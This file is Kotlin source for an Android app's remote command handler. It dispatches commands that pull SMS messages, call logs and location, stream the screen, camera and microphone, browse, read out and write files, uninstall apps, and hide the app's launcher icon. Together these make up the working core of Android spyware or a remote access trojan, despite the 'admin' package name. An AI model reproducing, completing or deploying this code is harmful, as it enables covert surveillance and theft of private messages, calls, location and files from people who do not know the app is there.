package com.example.admin

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.location.LocationManager
import android.net.Uri
import android.os.Build
import android.provider.CallLog
import android.util.Base64
import androidx.core.content.ContextCompat
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import org.webrtc.*
import java.io.File

object CommandHandler {
    private var webRtcClient: WebRtcClient? = null

    suspend fun dispatch(ctx: Context, cmd: String, args: JSONObject): JSONObject = withContext(Dispatchers.IO) {
        try {
            when (cmd) {
                "get_device_info" -> {
                    val battery = ctx.getSystemService(Context.BATTERY_SERVICE).let { (it as android.os.BatteryManager).getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) }
                    val dm = ctx.resources.displayMetrics
                    ok(JSONObject().put("model", Build.MODEL).put("battery", "$battery%").put("screen_w", dm.widthPixels).put("screen_h", dm.heightPixels))
                }
                "get_sms" -> {
                    val out = JSONArray(); ctx.contentResolver.query(Uri.parse("content://sms"), arrayOf("address", "body"), null, null, "date DESC LIMIT 50")?.use { while (it.moveToNext()) out.put(JSONObject().put("from", it.getString(0)).put("body", it.getString(1))) }
                    ok(out)
                }
                "get_calllogs" -> {
                    val out = JSONArray(); ctx.contentResolver.query(CallLog.Calls.CONTENT_URI, arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.DURATION), null, null, "date DESC LIMIT 50")?.use { while (it.moveToNext()) out.put(JSONObject().put("number", it.getString(0)).put("duration", it.getLong(1))) }
                    ok(out)
                }
                "get_location" -> {
                    val lm = ctx.getSystemService(Context.LOCATION_SERVICE) as LocationManager
                    val l = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER) ?: lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER) ?: return@withContext fail("No fix")
                    ok(JSONObject().put("lat", l.latitude).put("lon", l.longitude))
                }
                "list_apps" -> {
                    val apps = ctx.packageManager.getInstalledPackages(0)
                    val out = JSONArray()
                    for (app in apps) { if (ctx.packageManager.getLaunchIntentForPackage(app.packageName) != null) out.put(JSONObject().put("name", app.applicationInfo.loadLabel(ctx.packageManager).toString()).put("pkg", app.packageName)) }
                    ok(out)
                }
                "uninstall_app" -> {
                    val intent = Intent(Intent.ACTION_DELETE).apply { data = Uri.parse("package:${args.optString("pkg")}"); addFlags(Intent.FLAG_ACTIVITY_NEW_TASK) }
                    ctx.startActivity(intent); ok()
                }
                "start_webrtc" -> {
                    val mode = args.optString("mode", "screen")
                    webRtcClient?.stop()
                    webRtcClient = WebRtcClient(ctx, object : PeerConnection.Observer {
                        override fun onIceCandidate(candidate: IceCandidate) { ConnectionService.push(JSONObject().put("type", "webrtc_ice").put("sdpMid", candidate.sdpMid).put("sdpMLineIndex", candidate.sdpMLineIndex).put("sdp", candidate.sdp).toString()) }
                        override fun onSignalingChange(p0: PeerConnection.SignalingState?) {}
                        override fun onIceConnectionChange(p0: PeerConnection.IceConnectionState?) {}
                        override fun onIceConnectionReceivingChange(p0: Boolean) {}
                        override fun onIceGatheringChange(p0: PeerConnection.IceGatheringState?) {}
                        override fun onIceCandidatesRemoved(p0: Array<out IceCandidate>?) {}
                        override fun onAddStream(p0: MediaStream?) {}
                        override fun onRemoveStream(p0: MediaStream?) {}
                        override fun onDataChannel(p0: DataChannel?) {}
                        override fun onRenegotiationNeeded() {}
                    })
                    if (mode == "screen") {
                        val data = ConnectionService.screenData ?: return@withContext fail("Grant Screen Capture first")
                        val projection = (ctx.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as android.media.projection.MediaProjectionManager).getMediaProjection(ConnectionService.screenResultCode, data)
                        webRtcClient?.startScreenCapture(projection!!)
                    } else { webRtcClient?.startCameraCapture(mode == "front") }
                    ok()
                }
                "stop_webrtc" -> { webRtcClient?.stop(); webRtcClient = null; ok() }
                "webrtc_answer" -> { webRtcClient?.onAnswerReceived(args.optString("sdp")); ok() }
                "webrtc_ice" -> { webRtcClient?.onIceCandidateReceived(args.optString("sdpMid"), args.optInt("sdpMLineIndex"), args.optString("sdp")); ok() }
                
                "list_dir" -> {
                    val dir = File(args.optString("path", "/sdcard")); if (!dir.exists()) return@withContext fail("Not found")
                    val arr = JSONArray(); dir.listFiles()?.sortedBy { it.name }?.take(200)?.forEach { arr.put(JSONObject().put("name", it.name).put("path", it.absolutePath).put("dir", it.isDirectory).put("size", if (it.isFile) it.length() else 0L)) }
                    ok(JSONObject().put("path", dir.absolutePath).put("entries", arr))
                }
                "read_file_chunk" -> {
                    val f = File(args.optString("path", "")); if (!f.exists()) return@withContext fail("Not found")
                    val offset = args.optLong("offset", 0L); val size = args.optInt("size", 65536)
                    if (offset >= f.length()) return@withContext fail("EOF")
                    val bytes = ByteArray(size)
                    java.io.RandomAccessFile(f, "r").use { raf -> raf.seek(offset); val read = raf.read(bytes); if (read == -1) return@withContext fail("EOF")
                        val actualBytes = if (read < size) bytes.copyOf(read) else bytes
                        ok(JSONObject().put("b64", Base64.encodeToString(actualBytes, Base64.NO_WRAP)).put("eof", offset + read >= f.length()))
                    }
                }
                "upload_file" -> { val bytes = Base64.decode(args.optString("data", ""), Base64.DEFAULT); val f = File(args.optString("path", "")); f.parentFile?.mkdirs(); f.writeBytes(bytes); ok(JSONObject().put("path", f.absolutePath)) }
                "hide_icon" -> { StealthManager.hide(ctx); ok() }
                "unhide_icon" -> { StealthManager.unhide(ctx); ok() }
                "start_audio" -> { ContextCompat.startForegroundService(ctx, Intent(ctx, LiveAudioService::class.java)); ok() }
                "stop_audio" -> { ctx.startService(Intent(ctx, LiveAudioService::class.java).apply { action = LiveAudioService.ACTION_STOP }); ok() }
                else -> fail("unknown cmd: $cmd")
            }
        } catch (e: Exception) { fail(e.message ?: e.javaClass.simpleName) }
    }

    private fun ok(data: Any? = null) = JSONObject().put("ok", true).apply { if (data != null) put("data", data) }
    private fun fail(msg: String) = JSONObject().put("ok", false).put("error", msg)
}
